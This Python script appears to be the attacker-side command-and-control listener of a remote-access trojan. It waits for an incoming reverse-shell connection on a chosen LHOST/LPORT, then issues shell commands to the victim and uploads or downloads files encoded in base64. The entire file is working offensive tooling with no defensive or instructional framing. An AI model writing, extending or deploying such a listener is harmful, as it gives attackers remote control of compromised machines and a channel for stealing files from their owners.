#!/usr/bin/python
import socket, json, base64

class CANDc:
    def __init__(self, ip, port):
        cANDc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cANDc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cANDc.bind((ip, port))
        cANDc.listen(0)
        print(" ...Waiting for incoming connections....")
        self.connection, address = cANDc.accept()
        print("Connection established from " + str(address))

    def send_integrity(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive_integrity(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def comms(self, cmd):
        self.send_integrity(cmd)
        if cmd[0] == "exit":
            self.connection.close()
            exit()
        return self.receive_integrity()

    def write_file(self, path, contents):
        with open(path, "wb") as file:
            file.write(base64.b64decode(contents))
            return "Download successful!"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            cmd = input(">>> ")
            cmd = cmd.split(" ")
            try:
                if cmd[0] == "upload":
                    file_content = self.read_file(cmd[1])
                    cmd.append(file_content.decode())
                result = self.comms(cmd)
                if cmd[0] == "download" and "[+] Command Error " not in result:
                    result = self.write_file(cmd[1], result)
            except Exception:
                result = "[+] Error during execution."
            print(result)

# Enter your IP and port of choice, IP must be a string, port must be an integer
ip = input("Enter your LHOST: ")
port = input("Enter your LPORT: ")

the_listener = CANDc(ip, int(port))
the_listener.run()

